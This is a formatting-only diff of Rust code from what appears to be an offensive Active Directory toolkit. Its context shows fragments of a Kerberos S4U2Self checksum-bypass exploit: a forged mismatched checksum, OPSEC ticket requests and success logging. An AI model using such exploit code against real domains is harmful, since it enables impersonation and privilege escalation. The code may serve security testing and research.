@@ -24,8 +24,8 @@
 
 use overthrone_core::error::Result;
 use overthrone_core::proto::kerberos::{
-    Checksum, build_s4u2self_checksum,
-    request_tgt_opsec, s4u2self_with_checksum_bypass, RequestTgtOptions,
+    Checksum, RequestTgtOptions, build_s4u2self_checksum, request_tgt_opsec,
+    s4u2self_with_checksum_bypass,
 };
 use serde::{Deserialize, Serialize};
 use tracing::info;
@@ -189,14 +189,8 @@ pub async fn exploit_checksum_bypass(
         }
         ChecksumTechnique::MismatchedBody => {
             // Compute checksum for a different user/realm
-            let wrong = build_s4u2self_checksum(
-                "WrongUser",
-                "WRONG.REALM",
-                &tgt.session_key,
-            )?;
-            log.push(format!(
-                "  Mismatched checksum: for WrongUser@WRONG.REALM"
-            ));
+            let wrong = build_s4u2self_checksum("WrongUser", "WRONG.REALM", &tgt.session_key)?;
+            log.push(format!("  Mismatched checksum: for WrongUser@WRONG.REALM"));
             (Some(wrong), None)
         }
         ChecksumTechnique::SkipValidation => {
@@ -236,7 +230,11 @@ pub async fn exploit_checksum_bypass(
 
             log.push(format!(
                 "  S4U2Self bypass {}",
-                if bypass_succeeded { "SUCCEEDED" } else { "FAILED" }
+                if bypass_succeeded {
+                    "SUCCEEDED"
+                } else {
+                    "FAILED"
+                }
             ));
             log.push(format!(
                 "  TGS obtained for {}@{}",
@@ -331,7 +329,10 @@ mod tests {
     #[test]
     fn test_technique_display() {
         assert_eq!(ChecksumTechnique::NullChecksum.to_string(), "NullChecksum");
-        assert_eq!(ChecksumTechnique::SkipValidation.to_string(), "SkipValidation");
+        assert_eq!(
+            ChecksumTechnique::SkipValidation.to_string(),
+            "SkipValidation"
+        );
     }
 
     #[test]
